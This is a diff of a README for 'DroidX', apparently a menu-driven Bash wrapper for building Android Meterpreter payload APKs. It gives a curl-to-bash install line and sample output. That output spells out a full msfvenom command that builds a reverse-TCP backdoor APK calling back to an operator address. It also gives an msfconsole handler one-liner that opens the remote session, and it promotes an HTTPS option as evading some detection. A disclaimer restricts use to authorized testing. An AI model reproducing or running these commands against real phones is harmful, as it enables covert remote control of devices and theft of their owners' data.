@@ -1,55 +1,108 @@
-# DroidX v1.0
+# DROIDX — Android Payload Builder
 
-**Android Payload Builder (MSFvenom Wrapper)**
+**Generate Android Meterpreter payloads with an interactive menu. Works with or without Metasploit.**
 
-Generate Android Meterpreter payloads with an interactive menu. Works with or without Metasploit installed.
+Part of the **AdhiHub** security toolkit.
+
+---
+
+## What It Does
+
+DroidX helps you create Android APK payloads for authorized penetration testing:
+
+| Payload Type | What It Does |
+|-------------|-------------|
+| **Reverse TCP** | Target phone connects back to you (most common) |
+| **Bind Shell** | Opens a port on the target phone — you connect to it |
+| **HTTPS** | Encrypted reverse connection (evades some detection) |
+
+If **msfvenom** is installed: DroidX generates the actual APK for you.
+If **msfvenom** is NOT installed: DroidX shows you the exact command to copy-paste.
+
+---
 
 ## One-Line Install
 
 ```bash
-curl -sL https://raw.githubusercontent.com/AdhiHub/droidx/main/install.sh | sudo bash
+curl -fsSL https://raw.githubusercontent.com/AdhiHub/droidx/main/install.sh | bash
 ```
 
-## Features
+After install:
 
-| Feature | Description |
-|---------|-------------|
-| Reverse TCP | Create android/meterpreter/reverse_tcp payload |
-| Bind Shell | Create android/meterpreter/bind_tcp payload |
-| HTTPS | Create android/meterpreter/reverse_https payload |
-| Smart Mode | If msfvenom is installed, generates APK; otherwise shows command |
-| Listener Setup | Companion meterpreter listener command (or auto-start) |
-| Payload Reference | Lists common Android payloads |
-| Logging | Saves all commands to a timestamped file |
+```bash
+droidx
+```
 
-## Usage
+---
+
+## How to Use
 
 ```bash
 # Interactive menu
-./droidx.sh
+droidx
 
-# Show help
-./droidx.sh -h
+# Help
+droidx -h
 ```
 
-Menu options:
-1. **Reverse TCP** - LHOST connects to your listener
-2. **Bind Shell** - You connect to LHOST
-3. **HTTPS** - Encrypted reverse connection
-4. **List Payloads** - View common Android payloads
-5. **Help** - Usage information
+### Menu Options
+
+1. **Reverse TCP** — You need LHOST + LPORT. Target connects to you.
+2. **Bind Shell** — You need LHOST + LPORT. You connect to target.
+3. **HTTPS** — Encrypted reverse connection (needs certificate setup)
+4. **List Payloads** — Shows common Android Meterpreter payloads
+5. **Help** — Usage info
+
+### What You Enter
+
+```
+LHOST: 192.168.1.5      # Your IP (the listener)
+LPORT: 4444              # Your port (the listener)
+```
+
+---
+
+## What The Output Looks Like
+
+```
+LHOST: 192.168.1.5
+LPORT: 4444
+
+[+] Payload: android/meterpreter/reverse_tcp
+
+[+] LHOST: 192.168.1.5
+[+] LPORT: 4444
+
+[+] Run this to generate APK:
+    msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -o /tmp/payload.apk
+
+[+] Then start your listener:
+    msfconsole -q -x "use multi/handler; set payload android/meterpreter/reverse_tcp; set LHOST 192.168.1.5; set LPORT 4444; exploit"
+```
+
+---
 
 ## Requirements
 
+- **Linux** or **Termux** (Android)
 - Bash 4+
-- curl
-- Optional: Metasploit Framework (msfvenom, msfconsole)
+- Optional: Metasploit Framework (msfvenom + msfconsole)
 
-Works on **Linux** and **Termux** (Android).
+---
 
-## Disclaimer
+## Run Without Installing
 
+```bash
+git clone https://github.com/AdhiHub/droidx.git
+cd droidx
+chmod +x droidx.sh
+./droidx.sh
 ```
-Use at your own risk. Developer(s) assume NO liability.
-For authorized penetration testing and educational purposes only.
-```
+
+---
+
+> **⚠️ DISCLAIMER: FOR EDUCATIONAL PURPOSES ONLY**
+>
+> Use at your own risk. Developer(s) assume NO liability.
+> Only generate payloads for devices you own or have explicit written permission to test.
+> Deploying malware on devices without consent is a serious crime.
